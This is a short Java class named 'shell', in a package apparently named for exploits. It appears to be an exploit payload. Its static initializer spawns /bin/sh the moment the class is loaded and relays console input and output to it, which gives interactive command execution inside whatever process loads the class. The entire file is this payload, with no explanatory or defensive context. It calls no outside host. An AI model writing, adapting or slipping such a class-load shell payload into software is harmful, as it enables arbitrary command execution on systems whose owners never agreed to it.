package exp;

import java.io.*;

public class shell {
  private static volatile boolean done = false;

  static {
    try {
      Process proc = new ProcessBuilder("/bin/sh").inheritIO().start();
      BufferedInputStream procOup = new BufferedInputStream(proc.getInputStream());
      BufferedInputStream consInp = new BufferedInputStream(System.in);
      
      Thread reader = new Thread(() -> {
        try {
          int c;
          while (!done && (c = consInp.read()) != -1) {
            proc.getOutputStream().write(c);
          }
          done = true;
        } catch (Exception e) {
          e.printStackTrace();
        }
      });
      reader.start();

      int c;
      while (!done) {
        c = procOup.read();
        if (c == -1) {
          if (proc.isAlive()) continue;
          else break;
        }
        System.out.write(c);
        System.out.flush();
      }
      proc.waitFor();
      done = true;
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
